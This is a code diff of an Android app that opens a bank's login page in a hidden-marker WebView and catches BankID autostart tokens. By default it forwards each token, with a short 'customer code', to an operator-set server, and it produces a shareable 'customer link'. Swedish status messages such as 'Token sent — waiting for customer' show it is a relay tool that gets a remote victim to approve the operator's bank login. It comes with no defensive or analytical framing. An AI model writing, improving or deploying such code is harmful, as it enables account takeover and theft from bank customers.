@@ -1,109 +1,291 @@
 package com.relay
 
 import android.annotation.SuppressLint
+import android.app.Activity
+import android.content.ClipData
+import android.content.ClipboardManager
+import android.content.Context
 import android.content.Intent
+import android.graphics.Color
 import android.net.Uri
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
+import android.text.InputType
+import android.view.Gravity
+import android.view.ViewGroup
+import android.webkit.CookieManager
+import android.webkit.WebChromeClient
 import android.webkit.WebResourceRequest
+import android.webkit.WebSettings
 import android.webkit.WebView
 import android.webkit.WebViewClient
 import android.widget.Button
 import android.widget.EditText
+import android.widget.LinearLayout
 import android.widget.TextView
-import androidx.appcompat.app.AppCompatActivity
+import android.widget.Toast
 import org.json.JSONObject
+import java.io.OutputStreamWriter
+import java.net.HttpURLConnection
+import java.net.URL
+import kotlin.concurrent.thread
 
-class MainActivity : AppCompatActivity() {
+class MainActivity : Activity() {
+
+    private val h = Handler(Looper.getMainLooper())
+
+    private lateinit var p: android.content.SharedPreferences
+    private lateinit var serverBox: EditText
+    private lateinit var bankBox: EditText
+    private lateinit var statusBar: TextView
+    private lateinit var modeBtn: Button
     private lateinit var web: WebView
-    private lateinit var status: TextView
-    private var session = ""
 
-    @SuppressLint("SetJavaScriptEnabled")
-    override fun onCreate(b: Bundle?) {
-        super.onCreate(b)
-        Api.prefs = prefs()
-        setContentView(R.layout.main)
-        web = findViewById(R.id.web)
-        status = findViewById(R.id.status)
-        web.keepScreenOn = true
-        web.settings.javaScriptEnabled = true
-        web.settings.domStorageEnabled = true
-        try {
-            web.settings.userAgentString = web.settings.userAgentString.replace("; wv", "")
-        } catch (e: Exception) {
-        }
-        status.setOnLongClickListener {
-            prefs().edit().remove("session").apply()
-            newSession()
-            true
-        }
-        web.webViewClient = object : WebViewClient() {
-            override fun shouldOverrideUrlLoading(v: WebView, r: WebResourceRequest): Boolean {
-                if (r.url.scheme == "bankid") { grab(r.url); return true }
-                return false
+    private val tokenPaths = listOf("/api/token", "/api/push", "/token", "/api/relay")
+
+    private val nudge = object : Runnable {
+        override fun run() {
+            try {
+                web.onPause()
+                web.onResume()
+                web.evaluateJavascript(
+                    """(function(){try{document.dispatchEvent(new Event('visibilitychange'));window.dispatchEvent(new Event('focus'));window.dispatchEvent(new Event('pageshow'));}catch(e){}})();""",
+                    null
+                )
+            } catch (t: Throwable) {
             }
+            h.postDelayed(this, 2000)
         }
-        findViewById<EditText>(R.id.server).setText(Api.base)
-        findViewById<Button>(R.id.save).setOnClickListener {
-            val s = findViewById<EditText>(R.id.server).text.toString().trim()
-            prefs().edit().putString("server", s).apply()
-            status.text = "Server sparad"
-            newSession()
-        }
-        findViewById<Button>(R.id.reload).setOnClickListener { web.reload() }
-        findViewById<Button>(R.id.mode).setOnClickListener { toggle() }
-        findViewById<Button>(R.id.share).setOnClickListener { share() }
-        findViewById<Button>(R.id.go).setOnClickListener {
-            val u = findViewById<EditText>(R.id.url).text.toString().trim()
-            if (u.isNotEmpty()) web.loadUrl(if (u.startsWith("http")) u else "https://$u")
-        }
-        updateMode()
-        newSession()
     }
 
-    private fun newSession() {
-        val code = prefs().getString("session", null) ?: Api.newCode()
-        session = code
-        prefs().edit().putString("session", code).apply()
-        status.text = "Kundkod: $code"
-        RelaySocket.connect(code) { txt ->
-            runOnUiThread {
-                when (JSONObject(txt).optString("type")) {
-                    "token"   -> status.text = "Token skickad — väntar på kund"
-                    "expired" -> status.text = "Token dog — ladda om banken"
+    private fun dp(v: Int): Int = (v * resources.displayMetrics.density).toInt()
+
+    private fun rowLp(): LinearLayout.LayoutParams =
+        LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT)
+
+    private fun toast(s: String) {
+        Toast.makeText(this, s, Toast.LENGTH_SHORT).show()
+    }
+
+    private fun newCode(): String {
+        val c = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
+        val sb = StringBuilder()
+        var i = 0
+        while (i < 5) {
+            sb.append(c[(Math.random() * c.length).toInt()])
+            i++
+        }
+        return sb.toString()
+    }
+
+    @SuppressLint("SetJavaScriptEnabled")
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+
+        p = getSharedPreferences("relay", Context.MODE_PRIVATE)
+        if (p.getString("code", null) == null) {
+            p.edit().putString("code", newCode()).apply()
+        }
+
+        val root = LinearLayout(this)
+        root.orientation = LinearLayout.VERTICAL
+        root.setBackgroundColor(Color.parseColor("#0E1621"))
+        root.setPadding(dp(10), dp(10), dp(10), dp(6))
+
+        serverBox = EditText(this)
+        serverBox.hint = "Server-URL"
+        serverBox.inputType = InputType.TYPE_TEXT_VARIATION_URI
+        serverBox.setText(p.getString("server", ""))
+        root.addView(serverBox, rowLp())
+
+        bankBox = EditText(this)
+        bankBox.hint = "Banksida, t.ex. online.swedbank.se"
+        bankBox.inputType = InputType.TYPE_TEXT_VARIATION_URI
+        bankBox.setText(p.getString("bank", ""))
+        root.addView(bankBox, rowLp())
+
+        val row = LinearLayout(this)
+        row.orientation = LinearLayout.HORIZONTAL
+        row.gravity = Gravity.CENTER_VERTICAL
+
+        statusBar = TextView(this)
+        statusBar.setTextColor(Color.WHITE)
+        statusBar.textSize = 15f
+        statusBar.setPadding(dp(6), dp(10), dp(6), dp(10))
+        statusBar.text = "Kundkod: " + p.getString("code", "-----")
+        row.addView(statusBar, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
+
+        modeBtn = Button(this)
+        modeBtn.text = if (p.getBoolean("forward", true)) "-> kund" else "-> egen"
+        modeBtn.setOnClickListener {
+            val f = !p.getBoolean("forward", true)
+            p.edit().putBoolean("forward", f).apply()
+            modeBtn.text = if (f) "-> kund" else "-> egen"
+        }
+        row.addView(modeBtn)
+        root.addView(row, rowLp())
+
+        val btns = LinearLayout(this)
+        btns.orientation = LinearLayout.HORIZONTAL
+
+        val goBtn = Button(this)
+        goBtn.text = "Oppna bank"
+        goBtn.setOnClickListener { openBank() }
+        btns.addView(goBtn, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
+
+        val linkBtn = Button(this)
+        linkBtn.text = "Kundlank"
+        linkBtn.setOnClickListener { copyLink() }
+        btns.addView(linkBtn, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
+
+        root.addView(btns, rowLp())
+
+        web = WebView(this)
+        web.settings.javaScriptEnabled = true
+        web.settings.domStorageEnabled = true
+        web.settings.databaseEnabled = true
+        web.settings.useWideViewPort = true
+        web.settings.loadWithOverviewMode = true
+        web.settings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
+        try {
+            web.settings.userAgentString = web.settings.userAgentString.replace("; wv", "")
+        } catch (t: Throwable) {
+        }
+        try {
+            CookieManager.getInstance().setAcceptCookie(true)
+            CookieManager.getInstance().setAcceptThirdPartyCookies(web, true)
+        } catch (t: Throwable) {
+        }
+        web.webChromeClient = WebChromeClient()
+        web.webViewClient = object : WebViewClient() {
+            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
+                return grab(url)
+            }
+
+            override fun shouldOverrideUrlLoading(view: WebView, req: WebResourceRequest): Boolean {
+                return grab(req.url.toString())
+            }
+        }
+        root.addView(web, LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f))
+
+        setContentView(root)
+
+        statusBar.setOnLongClickListener {
+            val c = newCode()
+            p.edit().putString("code", c).remove("last").apply()
+            statusBar.text = "Kundkod: " + c
+            copyLink()
+            true
+        }
+
+        h.postDelayed(nudge, 2000)
+
+        val b = p.getString("bank", "")
+        if (b != null && b.isNotEmpty()) openBank()
+    }
+
+    override fun onDestroy() {
+        try {
+            h.removeCallbacks(nudge)
+        } catch (t: Throwable) {
+        }
+        super.onDestroy()
+    }
+
+    private fun grab(url: String): Boolean {
+        if (!url.startsWith("bankid://")) return false
+        val u = Uri.parse(url)
+        val token = u.getQueryParameter("autostarttoken")
+        if (token != null && token.isNotEmpty()) {
+            if (token == p.getString("last", null)) return true
+            p.edit().putString("last", token).apply()
+            if (p.getBoolean("forward", true)) {
+                statusBar.text = "Token skickad"
+                send(token, u.getQueryParameter("redirect"))
+            } else {
+                statusBar.text = "Egen BankID"
+                try {
+                    startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)))
+                } catch (t: Throwable) {
+                    toast("BankID-appen hittades inte")
                 }
             }
         }
+        return true
     }
 
-    private fun grab(u: Uri) {
-        val t = u.getQueryParameter("autostarttoken")
-            ?: u.getQueryParameter("autoStartToken") ?: return
-        if (t == prefs().getString("last", null)) return
-        prefs().edit().putString("last", t).apply()
-        if (forward()) {
-            Api.postToken(session, t)
-            status.text = "Token skickad"
+    private fun base(): String {
+        var s = serverBox.text.toString().trim()
+        if (s.isEmpty()) return ""
+        if (!s.startsWith("http")) s = "https://$s"
+        return s.trimEnd('/')
+    }
+
+    private fun send(token: String, redirect: String?) {
+        val b = base()
+        if (b.isEmpty()) {
+            statusBar.text = "Fyll i server-URL"
+            return
         }
-        startActivity(Intent(Intent.ACTION_VIEW, u).setPackage("com.bankid.bus"))
+        p.edit().putString("server", b).apply()
+        val code = p.getString("code", "") ?: ""
+        thread {
+            var ok = false
+            var i = 0
+            while (i < tokenPaths.size && !ok) {
+                try {
+                    val c = URL(b + tokenPaths[i]).openConnection() as HttpURLConnection
+                    c.requestMethod = "POST"
+                    c.doOutput = true
+                    c.connectTimeout = 8000
+                    c.readTimeout = 8000
+                    c.setRequestProperty("Content-Type", "application/json")
+                    val body = JSONObject()
+                    body.put("code", code)
+                    body.put("token", token)
+                    body.put("redirect", redirect ?: "")
+                    body.put("autostarttoken", token)
+                    val w = OutputStreamWriter(c.outputStream, "UTF-8")
+                    w.write(body.toString())
+                    w.flush()
+                    w.close()
+                    val rc = c.responseCode
+                    if (rc in 200..299) ok = true
+                } catch (t: Throwable) {
+                }
+                i++
+            }
+            val res = ok
+            runOnUiThread {
+                if (!res) statusBar.text = "Token misslyckades"
+            }
+        }
     }
 
-    private fun share() {
-        if (session.isEmpty()) return
-        val i = Intent(Intent.ACTION_SEND)
-        i.type = "text/plain"
-        i.putExtra(Intent.EXTRA_TEXT, "${Api.base}/k/$session")
-        startActivity(Intent.createChooser(i, "Skicka till kund"))
+    private fun openBank() {
+        var b = bankBox.text.toString().trim()
+        if (b.isEmpty()) {
+            toast("Fyll i banksidan")
+            return
+        }
+        p.edit().putString("bank", b).putString("server", serverBox.text.toString().trim()).apply()
+        if (!b.startsWith("http")) b = "https://$b"
+        web.loadUrl(b)
     }
 
-    private fun prefs() = getSharedPreferences("relay", 0)
-    private fun forward() = prefs().getBoolean("forward", true)
-    private fun toggle() {
-        prefs().edit().putBoolean("forward", !forward()).apply()
-        updateMode()
+    private fun copyLink() {
+        val b = base()
+        if (b.isEmpty()) {
+            toast("Fyll i server-URL forst")
+            return
+        }
+        val link = b + "/k/" + (p.getString("code", "") ?: "")
+        try {
+            val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+            cm.setPrimaryClip(ClipData.newPlainText("kundlank", link))
+        } catch (t: Throwable) {
+        }
+        toast(link)
     }
-    private fun updateMode() {
-        findViewById<Button>(R.id.mode).text = if (forward()) "→ kund" else "→ egen"
-    }
-    override fun onDestroy() { RelaySocket.close(); super.onDestroy() }
 }
